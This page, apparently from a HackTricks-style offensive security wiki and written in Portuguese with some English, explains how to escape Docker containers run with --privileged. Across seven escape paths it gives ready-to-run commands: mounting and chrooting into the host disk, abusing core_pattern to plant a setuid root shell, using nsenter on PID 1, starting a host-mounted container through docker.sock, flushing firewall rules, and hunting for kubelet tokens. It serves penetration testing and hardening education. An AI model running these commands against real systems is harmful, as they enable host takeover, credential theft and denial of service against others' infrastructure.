# Escapando de containers `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Um container iniciado com `--privileged` não é a mesma coisa que um container normal com uma ou duas permissões extras. Na prática, `--privileged` remove ou enfraquece várias das proteções de runtime padrão que normalmente mantêm a carga de trabalho longe de recursos perigosos do host. O efeito exato ainda depende do runtime e do host, mas para Docker o resultado usual é:

- todas as capabilities do kernel são concedidas
- as restrições de cgroup de dispositivos são removidas
- muitos sistemas de arquivos do kernel deixam de ser montados como somente leitura
- os caminhos padrão mascarados do procfs desaparecem
- o filtro seccomp é desativado
- o confinamento AppArmor é desativado
- o isolamento SELinux é desativado ou substituído por um rótulo muito mais amplo

A consequência importante é que um container privilegiado geralmente não precisa de um kernel exploit sutil. Em muitos casos ele pode simplesmente interagir diretamente com dispositivos do host, sistemas de arquivos do kernel voltados para o host ou interfaces do runtime e então pivotar para um shell do host.

## O que `--privileged` não altera automaticamente

`--privileged` não junta automaticamente os namespaces PID, network, IPC ou UTS do host. Um container privilegiado ainda pode ter namespaces privados. Isso significa que algumas cadeias de escape exigem uma condição extra, como:

- um bind mount do host
- compartilhamento de PID com o host
- rede do host
- dispositivos do host visíveis
- interfaces proc/sys graváveis

Essas condições frequentemente são fáceis de satisfazer em más configurações reais, mas são conceitualmente separadas do `--privileged` em si.

## Caminhos de escape

### 1. Montar o disco do host através de dispositivos expostos

Um container privilegiado geralmente vê muito mais nós de dispositivo sob `/dev`. Se o bloco de dispositivo do host estiver visível, a forma mais simples de escape é montá-lo e `chroot` no sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Se a partição root não for óbvia, enumere primeiro o layout de blocos:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Se o caminho prático for plantar um setuid helper em um mount do host gravável em vez de `chroot`, lembre-se de que nem todo sistema de arquivos honra o bit setuid. Uma verificação rápida no host é:
```bash
mount | grep -v "nosuid"
```
This is useful because writable paths under `nosuid` filesystems are much less interesting for classic "drop a setuid shell and execute it later" workflows.

As proteções enfraquecidas exploradas aqui são:

- exposição completa de dispositivos
- capacidades amplas, especialmente `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Or Reuse A Host Bind Mount And `chroot`

Se o sistema de arquivos raiz do host já estiver montado dentro do container, ou se o container puder criar os mounts necessários porque é privileged, um shell do host costuma estar a apenas um `chroot` de distância:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se não existir um bind mount da raiz do host, mas o armazenamento do host for acessível, crie um:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este caminho abusa de:

- restrições de montagem enfraquecidas
- full capabilities
- falta de confinamento MAC

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusar de `/proc/sys` ou `/sys` graváveis

Uma das grandes consequências de `--privileged` é que as proteções de procfs e sysfs ficam muito mais fracas. Isso pode expor interfaces do kernel voltadas para o host que normalmente são mascaradas ou montadas como somente leitura.

Um exemplo clássico é `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Outros caminhos de alto valor incluem:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este caminho explora:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar capacidades completas para escape baseado em mount ou namespace

Um container privilegiado recebe as capacidades que normalmente são removidas de containers padrão, incluindo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, and many others. Isso costuma ser suficiente para transformar um acesso local em um escape para o host assim que outra superfície exposta existir.

Um exemplo simples é montar sistemas de arquivos adicionais e entrar no namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Se o PID do host também estiver compartilhado, a etapa fica ainda mais curta:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Este caminho abusa de:

- o conjunto padrão de capabilities privilegiadas
- compartilhamento opcional do PID do host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Um container privilegiado frequentemente fica com estado de runtime do host ou sockets visíveis. Se um socket Docker, containerd, ou CRI-O estiver acessível, a abordagem mais simples costuma ser usar a runtime API para lançar um segundo container com acesso ao host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Este caminho abusa de:

- exposição do runtime privilegiado
- bind mounts do host criados pelo próprio runtime

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Remover efeitos colaterais do isolamento de rede

`--privileged` does not by itself join the host network namespace, but if the container also has `--network=host` or other host-network access, the complete network stack becomes mutable:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Nem sempre isso resulta em um shell direto no host, mas pode causar denial of service, interceptação de tráfego ou acesso a loopback-only management services.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ler segredos do host e estado de runtime

Mesmo quando um escape limpo para um shell não é imediato, privileged containers frequentemente têm acesso suficiente para ler segredos do host, kubelet state, runtime metadata e neighboring container filesystems:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Se `/var` estiver montado no host ou os diretórios de runtime estiverem visíveis, isso pode ser suficiente para movimentação lateral ou roubo de credenciais cloud/Kubernetes mesmo antes de obter um shell no host.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Verificações

O propósito dos comandos a seguir é confirmar quais privileged-container escape families são imediatamente viáveis.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
O que é interessante aqui:

- um conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposição de proc/sys gravável
- dispositivos do host visíveis
- ausência de seccomp e de confinamento MAC
- runtime sockets ou host root bind mounts

Qualquer um desses pode ser suficiente para post-exploitation. Vários juntos geralmente significam que o container está, na prática, a um ou dois comandos de distância de comprometer o host.

## Páginas Relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
